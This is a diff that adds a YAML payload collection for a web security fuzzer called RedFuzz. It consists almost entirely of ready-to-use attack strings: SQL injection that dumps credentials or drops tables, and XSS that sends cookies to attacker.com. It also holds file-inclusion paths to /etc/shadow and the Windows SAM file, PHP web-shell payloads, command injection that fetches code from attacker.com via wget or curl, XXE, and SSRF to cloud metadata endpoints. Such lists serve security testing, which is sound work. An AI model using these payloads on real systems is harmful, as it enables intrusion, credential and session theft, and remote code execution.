@@ -1,0 +1,338 @@
+# RedFuzz v5.0.0 - Comprehensive Payload Collection
+# Author: 0xRedHood (https://github.com/0xRedHood)
+# This file contains all payloads for various attack vectors in YAML format
+
+version: "5.0.0"
+author: "0xRedHood"
+description: "Comprehensive payload collection for web application security testing"
+
+payloads:
+  sql_injection:
+    name: "SQL Injection"
+    description: "SQL injection attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic SQL injection techniques"
+        payloads:
+          - "' OR '1'='1"
+          - "' OR 1=1--"
+          - "'; DROP TABLE users--"
+          - "' UNION SELECT NULL--"
+          - "admin'--"
+          - "1' OR '1'='1'--"
+          - "' OR 1=1#"
+          - "' OR 1=1/*"
+          - "' OR '1'='1' OR '1'='1"
+          - "' OR 1=1 LIMIT 1--"
+          - "' OR 1=1 ORDER BY 1--"
+          - "' OR 1=1 GROUP BY 1--"
+      
+      advanced:
+        description: "Advanced SQL injection techniques"
+        payloads:
+          - "' UNION SELECT username,password FROM users--"
+          - "' UNION SELECT @@version--"
+          - "' UNION SELECT database()--"
+          - "' UNION SELECT user()--"
+          - "' UNION SELECT table_name FROM information_schema.tables--"
+          - "' UNION SELECT column_name FROM information_schema.columns--"
+          - "' UNION SELECT CONCAT(username,':',password) FROM users--"
+          - "' UNION SELECT LOAD_FILE('/etc/passwd')--"
+          - "' UNION SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
+      
+      boolean_based:
+        description: "Boolean-based SQL injection"
+        payloads:
+          - "' AND 1=1--"
+          - "' AND 1=2--"
+          - "' AND (SELECT COUNT(*) FROM users)>0--"
+          - "' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0--"
+          - "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>0--"
+      
+      time_based:
+        description: "Time-based SQL injection"
+        payloads:
+          - "'; WAITFOR DELAY '00:00:05'--"
+          - "'; SLEEP(5)--"
+          - "'; pg_sleep(5)--"
+          - "'; SELECT SLEEP(5)--"
+          - "'; BENCHMARK(5000000,MD5(1))--"
+      
+      error_based:
+        description: "Error-based SQL injection"
+        payloads:
+          - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
+          - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--"
+          - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+  xss:
+    name: "Cross-Site Scripting (XSS)"
+    description: "XSS attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic XSS techniques"
+        payloads:
+          - "<script>alert('XSS')</script>"
+          - "<img src=x onerror=alert('XSS')>"
+          - "javascript:alert('XSS')"
+          - "<svg onload=alert('XSS')>"
+          - "'><script>alert('XSS')</script>"
+          - "<iframe src=javascript:alert('XSS')>"
+          - "<body onload=alert('XSS')>"
+          - "<input onfocus=alert('XSS') autofocus>"
+          - "<textarea onfocus=alert('XSS') autofocus>"
+      
+      advanced:
+        description: "Advanced XSS techniques"
+        payloads:
+          - "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
+          - "<img src=x onerror=\"fetch('http://attacker.com?cookie='+document.cookie)\">"
+          - "<svg onload=\"fetch('http://attacker.com?cookie='+document.cookie)\">"
+          - "<script>new Image().src=\"http://attacker.com?cookie=\"+document.cookie;</script>"
+          - "<script>document.location=\"http://attacker.com?cookie=\"+document.cookie;</script>"
+      
+      filter_bypass:
+        description: "XSS filter bypass techniques"
+        payloads:
+          - "<ScRiPt>alert('XSS')</ScRiPt>"
+          - "<script>alert(String.fromCharCode(88,83,83))</script>"
+          - "<script>eval('ale'+'rt(\"XSS\")')</script>"
+          - "<script>setTimeout('alert(\"XSS\")',1000)</script>"
+          - "<img src=\"javascript:alert('XSS')\">"
+          - "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPjwvc3ZnPg==\">"
+      
+      dom_xss:
+        description: "DOM-based XSS"
+        payloads:
+          - "javascript:alert(document.cookie)"
+          - "javascript:alert(location.href)"
+          - "javascript:alert(location.search)"
+          - "javascript:alert(location.hash)"
+
+  lfi:
+    name: "Local File Inclusion (LFI)"
+    description: "LFI attack payloads"
+    severity: "High"
+    categories:
+      unix_linux:
+        description: "Unix/Linux file inclusion"
+        payloads:
+          - "../../../etc/passwd"
+          - "/etc/passwd"
+          - "....//....//....//etc/passwd"
+          - "..%2F..%2F..%2Fetc%2Fpasswd"
+          - "../../../etc/hosts"
+          - "/etc/hosts"
+          - "../../../etc/shadow"
+          - "/proc/version"
+          - "/proc/self/environ"
+          - "../../../etc/passwd%00"
+          - "/etc/passwd%00"
+      
+      windows:
+        description: "Windows file inclusion"
+        payloads:
+          - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+          - "c:\\windows\\system32\\drivers\\etc\\hosts"
+          - "..\\..\\..\\windows\\system32\\config\\sam"
+          - "c:\\windows\\system32\\config\\sam"
+          - "..\\..\\..\\windows\\win.ini"
+          - "c:\\windows\\win.ini"
+      
+      php_wrappers:
+        description: "PHP wrapper techniques"
+        payloads:
+          - "php://filter/convert.base64-encode/resource=/etc/passwd"
+          - "php://filter/read=convert.base64-encode/resource=/etc/passwd"
+          - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+"
+          - "php://input"
+          - "expect://id"
+
+  rfi:
+    name: "Remote File Inclusion (RFI)"
+    description: "RFI attack payloads"
+    severity: "Critical"
+    categories:
+      basic:
+        description: "Basic RFI techniques"
+        payloads:
+          - "http://evil.com/shell.txt"
+          - "https://attacker.com/backdoor.php"
+          - "ftp://evil.com/payload.txt"
+          - "//evil.com/shell.txt"
+          - "data://text/plain,<?php system($_GET['cmd']); ?>"
+          - "php://input"
+          - "expect://id"
+
+  command_injection:
+    name: "Command Injection"
+    description: "Command injection attack payloads"
+    severity: "Critical"
+    categories:
+      unix_linux:
+        description: "Unix/Linux command injection"
+        payloads:
+          - "; ls -la"
+          - "| whoami"
+          - "`id`"
+          - "$(whoami)"
+          - "; cat /etc/passwd"
+          - "| netstat -an"
+          - "; uname -a"
+          - "| ps aux"
+          - "; find / -name '*.txt'"
+          - "| wget http://attacker.com/shell"
+          - "; curl http://attacker.com"
+          - "| wget -qO- http://attacker.com/shell"
+      
+      windows:
+        description: "Windows command injection"
+        payloads:
+          - "& dir"
+          - "| whoami"
+          - "; dir"
+          - "& type C:\\windows\\system32\\drivers\\etc\\hosts"
+          - "| net user"
+          - "; systeminfo"
+          - "& ipconfig"
+          - "| tasklist"
+          - "; ping -c 1 attacker.com"
+          - "| nslookup attacker.com"
+          - "; curl http://attacker.com"
+          - "| wget -qO- http://attacker.com/shell"
+
+  ssrf:
+    name: "Server-Side Request Forgery (SSRF)"
+    description: "SSRF attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic SSRF techniques"
+        payloads:
+          - "http://127.0.0.1"
+          - "http://localhost"
+          - "http://0.0.0.0"
+          - "http://[::1]"
+          - "http://169.254.169.254"
+          - "http://metadata.google.internal"
+          - "http://169.254.170.2"
+          - "http://169.254.169.254/latest/meta-data/"
+
+  open_redirect:
+    name: "Open Redirect"
+    description: "Open redirect attack payloads"
+    severity: "Medium"
+    categories:
+      basic:
+        description: "Basic open redirect techniques"
+        payloads:
+          - "http://evil.com"
+          - "//evil.com"
+          - "javascript:window.location='http://evil.com'"
+          - "data:text/html,<script>window.location='http://evil.com'</script>"
+
+  template_injection:
+    name: "Template Injection"
+    description: "Template injection attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic template injection techniques"
+        payloads:
+          - "{{7*7}}"
+          - "${7*7}"
+          - "#{7*7}"
+          - "{{config}}"
+          - "${config}"
+          - "#{config}"
+          - "{{request}}"
+          - "${request}"
+          - "#{request}"
+
+  no_sql_injection:
+    name: "NoSQL Injection"
+    description: "NoSQL injection attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic NoSQL injection techniques"
+        payloads:
+          - '{"$gt": ""}'
+          - '{"$ne": ""}'
+          - '{"$regex": ".*"}'
+          - '{"$where": "1==1"}'
+          - '{"$exists": true}'
+          - '{"$in": ["admin", "user"]}'
+          - '{"$nin": ["user"]}'
+          - '{"$or": [{"user": "admin"}, {"pass": "test"}]}'
+
+  ldap_injection:
+    name: "LDAP Injection"
+    description: "LDAP injection attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic LDAP injection techniques"
+        payloads:
+          - "*"
+          - "*)(uid=*))(|(uid=*"
+          - "*)(|(password=*))"
+          - "*))%00"
+          - "*)(|(objectclass=*))"
+          - "*)(|(cn=*))"
+          - "*)(|(mail=*))"
+          - "*)(|(sn=*))"
+
+  xml_injection:
+    name: "XML Injection"
+    description: "XML injection attack payloads"
+    severity: "High"
+    categories:
+      basic:
+        description: "Basic XML injection techniques"
+        payloads:
+          - "<![CDATA[<script>alert('XSS')</script>]]>"
+          - "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"
+          - "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><test>&xxe;</test>"
+          - "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><test>&evil;</test>"
+
+  header_injection:
+    name: "HTTP Header Injection"
+    description: "HTTP header injection attack payloads"
+    severity: "Medium"
+    categories:
+      basic:
+        description: "Basic header injection techniques"
+        payloads:
+          - "X-Forwarded-For: 127.0.0.1"
+          - "X-Forwarded-For: 192.168.1.1"
+          - "X-Real-IP: 127.0.0.1"
+          - "X-Originating-IP: 127.0.0.1"
+          - "X-Remote-IP: 127.0.0.1"
+          - "X-Remote-Addr: 127.0.0.1"
+          - "X-Client-IP: 127.0.0.1"
+          - "X-Host: localhost"
+          - "X-Forwarded-Server: localhost"
+          - "X-HTTP-Host-Override: localhost"
+          - "Forwarded: for=127.0.0.1"
+          - "Via: 1.1 localhost"
+          - "True-Client-IP: 127.0.0.1"
+          - "X-Forwarded-For-Original: 127.0.0.1"
+          - "X-Original-URL: /admin"
+          - "X-Rewrite-URL: /admin"
+          - "X-Custom-IP-Authorization: 127.0.0.1"
+          - "X-Forwarded-For: 127.0.0.1, 192.168.1.1"
+          - "X-Forwarded-For: 127.0.0.1, 192.168.1.1, 10.0.0.1"
+          - "X-Forwarded-For: 127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1"
+          - "X-Forwarded-For: 127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 8.8.8.8"
+          - "X-Forwarded-For: 127.0.0.1, 192.168.1.1, 10.0.0.1, 172.16.0.1, 8.8.8.8, 1.1.1.1"
+
+# Configuration for payload loading
+config:
+  default_severity: "Medium"
+  max_payloads_per_category: 50
+  enable_custom_payloads: true
+  payload_validation: true
+  case_sensitive: false 
